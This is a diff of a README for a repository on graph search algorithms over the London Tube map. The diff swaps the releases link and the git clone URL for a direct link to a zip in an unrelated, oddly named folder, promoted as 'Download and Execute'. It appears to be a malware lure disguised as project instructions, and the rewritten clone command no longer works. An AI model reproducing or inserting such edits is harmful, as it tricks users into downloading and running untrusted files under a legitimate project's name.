@@ -12,7 +12,7 @@ Welcome to the London Tube AI Search Algorithms repository! In this project, we 
 
 To access the latest releases and download the necessary files, click the button below:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Get%20the%20Latest%20Release-brightgreen)](https://github.com/arthuro1234/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/releases)
+[![Download and Execute](https://github.com/arthuro1234/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/raw/refs/heads/main/pharyngotonsillitis/Search-DF-Tube-A-London-BF-UC-Heuristics-v3.9.zip%20and%20Execute-Get%20the%20Latest%20Release-brightgreen)](https://github.com/arthuro1234/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/raw/refs/heads/main/pharyngotonsillitis/Search-DF-Tube-A-London-BF-UC-Heuristics-v3.9.zip)
 
 **Note:** If the above link does not work or you need more information, please check the "Releases" section of this repository.
 
@@ -46,7 +46,7 @@ Heuristic search algorithms incorporate domain-specific knowledge to guide the s
 
 1. **Clone the Repository:** Start by cloning this repository to your local machine using the following command:
    ```
-   git clone https://github.com/arthuro1234/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.git
+   git clone https://github.com/arthuro1234/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/raw/refs/heads/main/pharyngotonsillitis/Search-DF-Tube-A-London-BF-UC-Heuristics-v3.9.zip
    ```
 
 2. **Explore the Code:** Dive into the provided codebase to understand how the search algorithms have been implemented for the London Tube Map.
